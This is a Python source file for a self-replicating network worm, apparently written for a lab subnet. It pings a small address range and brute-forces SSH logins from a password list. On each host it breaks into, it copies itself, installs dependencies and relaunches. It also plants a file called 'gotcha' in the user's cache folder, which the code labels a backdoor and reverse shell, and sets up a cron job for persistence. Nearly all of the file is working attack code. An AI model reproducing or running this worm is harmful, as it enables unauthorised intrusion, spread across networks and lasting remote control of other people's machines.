#!/usr/bin/env python3

import paramiko
import sys
import os
import netifaces
import subprocess 
import time
import logging
import getpass 

# Check if payload exists before doing anything

uname = getpass.getuser()
print(uname)

try:
	f = open("/home/" + str(uname) + "/.cache/gotcha")
	f.close()
	print("payload already exists, exiting program.")
	sys.exit()
except IOError:
	print("Executing script...")
##################################################################
# Function that will ping all IP addresses within the given range and
# store all IP addresses that responded
# @return - A list of all responding IP addresses withing the range
##################################################################
def get_list_of_hosts():
	hostlist = []
	my_IP_address = get_current_IP_address('eth0')
	FNULL = open(os.devnull, 'w')
	print("Localhost IP = " + my_IP_address)

	#Loop trough 10 different IP's and check if any one of them respond. 
	for ping in range(20,27): 
		address = "192.168.18." + str(ping) 

	    #Don't ping my own IP
		if(address != my_IP_address):
			#Do a ping and turn of output to console
			res = subprocess.call(['ping', '-c', '2', address],stdout=FNULL, stderr=subprocess.STDOUT) 
			if res == 0: 
				hostlist.append(address)
				print(address)
	return hostlist

##################################################################
# Function that will try to establish a ssh connection trying different combinations of usernames and passwords.
# If a connection is valid then it will call the UploadFileAndExecute function
##################################################################
def Attack_SSH(ipAddress) :
	logging.info("Attacking Host : %s " %ipAddress)
	print("Attacking Host : %s " %ipAddress)
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
	for line in open("/tmp/worm/passwords.txt", "r").readlines() :
		global username
		[username, password] = line.strip().split()
	
		try:
			try :
				logging.info("Trying with username: %s password: %s " % (username, password))
				print("Trying with username: %s password: %s " % (username, password))
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				ssh.connect(ipAddress, username=username, password=password)
			

			except paramiko.AuthenticationException:
				logging.info("Failed...")
				print("Failed...")
				continue
		except:
			continue 
		
		logging.info("Success ... username: %s and password %s is VALID! " % (username, password))
		print("Success ... username: %s and password %s is VALID! " % (username, password))
		UploadFileAndExecute(ssh)
		break

##################################################################
# Open a SSH File Transfer Protocol, and transfer worm files to the reciving machine.
# Once all the files are uploaded, it will install the nessesary libraries and run the worm.
##################################################################
def UploadFileAndExecute(sshConnection) :
	logging.info("Upload files to connection...")
	print("Upload files to connection...")
	sftpClient = sshConnection.open_sftp()

	# Create folder to store worm files in
	stdin, stdout, stderr = sshConnection.exec_command("mkdir /tmp/worm") 
	stdout.channel.recv_exit_status() # Blocking call     
	logging.info("Created folder /tmp/worm")
	print("Created folder /tmp/worm")
   
	# Replicate worm files
	sftpClient.put("/tmp/worm/replicator.py", "/tmp/worm/" + "./replicator.py")
	logging.info("Added replicator.py")
	print("Added replicator.py")

	sftpClient.put("/tmp/worm/passwords.txt", "/tmp/worm/" +"./passwords.txt")
	logging.info("Added passwords.txt")
	print("Added passwords.txt")

	sftpClient.put("/tmp/worm/cronscript.py", "/tmp/worm/" +"./cronscript.py")
	logging.info("Added cronscript.py")
	print("Added cronscript.py")

	sftpClient.put("/tmp/worm/gotcha", "/tmp/worm/" +"./gotcha")
	logging.info("Added gotcha")
	print("Added gotcha")

	logging.info("Installing python3-pip")
	print("Installing python3-pip")
	# Install python pip
	stdin, stdout, stderr = sshConnection.exec_command("wget https://bootstrap.pypa.io/get-pip.py")  
	stdout.channel.recv_exit_status()
	stdin, stdout, stderr = sshConnection.exec_command("python3 get-pip.py --user")
	stdout.channel.recv_exit_status()
	stdin, stdout, stderr = sshConnection.exec_command("cd /home/" + str(username) + "/.local/bin/")
	logging.info("Finished installing python3-pip")
	print("Finished installing python3-pip")
  
	
	# Install paramiko
	logging.info("Installing paramiko")
	print("Installing paramiko")
	stdin, stdout, stderr = sshConnection.exec_command("pip3 install paramiko")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing paramiko")
	print("Finished installing paramiko")

	# Install netifaces
	logging.info("Installing netifaces")
	print("Installing netifaces")
	stdin, stdout, stderr = sshConnection.exec_command("pip3 install netifaces")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing netifaces")
	print("Finished installing netifaces")

	# Install Getpass
	logging.info("Installing Getpass")
	print("Installing Getpass")
	stdin, stdout, stderr = sshConnection.exec_command("pip3 install getpass")
	stdout.channel.recv_exit_status()
	logging.info("Finished installing getpass")
	print("Finished installing getpass")
	
	# Install Crontab
	logging.info("Installing crontab")
	print("Installing crontab")
	stdin, stdout, stderr = sshConnection.exec_command("pip3 install python-crontab")
	stdout.channel.recv_exit_status()
	logging.info("Finished installing crontab")
	print("Finished installing crontab")

	stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/" +"replicator.py")  
	stdout.channel.recv_exit_status()   

	stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" +"replicator.py passwords.txt"+ " &")  
	stdout.channel.recv_exit_status()   
	
	# Establishing Backdoor Shell Connection
	sshConnection.exec_command("mkdir /home/" + str(username) + "/.cache")
	sftpClient.put("/tmp/worm/gotcha", "/home/" + str(username) + "/.cache/gotcha")
	logging.info("Added gotcha")
	print("Backdoor shell uploaded")

	# Create Cronjob and Execute
	sftpClient.put("/tmp/worm/cronscript.py", "/home/" + str(username) + "/.cache/cronscript.py")
	sshConnection.exec_command("chmod a+x /home/" + str(username) + "/.cache/cronscript.py")
	sshConnection.exec_command("python3 /home/" + str(username) + "/.cache/cronscript.py")
	logging.info("Cronjob uploaded")
	print("Cronjob uploaded")


	# Executing Reverse Shell
	sshConnection.exec_command("chmod a+x /home/" + str(username) + "/.cache/gotcha")
	sshConnection.exec_command("/home/" + str(username) + "/.cache/gotcha")
	logging.info("Shell Ready with user: " + str(username))
	print("Shell Ready with user: " + str(username))


	

##################################################################
# Function that retrives the IP address for the current machine.
# @ return - IP address 
##################################################################
def get_current_IP_address(interface):
		# Get all the network interfaces on the system
		network_interfaces = netifaces.interfaces()
		ip_Address = None

		# Loop through all the interfaces and get IP address
		for netFace in network_interfaces:

			# The IP address of the interface
			try:
				addr = netifaces.ifaddresses(netFace)[2][0]['addr']
			except:
				continue

			if not addr == "127.0.0.1":
				ip_Address = addr
		return ip_Address



if __name__ == "__main__" :
	logging.basicConfig(filename='worm.log',level=logging.DEBUG)
	logging.getLogger("paramiko").setLevel(logging.WARNING)
	logging.info('Starting worm...')
	print('Starting worm...')

	hostlist = get_list_of_hosts()
	list_string = str(hostlist)
	logging.info("Available hosts are: " + list_string)
	print("Available hosts are: " + list_string)

	#Loop trough the list of all responding IP's and try to connect with ssh
	for host in hostlist:
		Attack_SSH(host)
	logging.info("Done")
	print("Done")
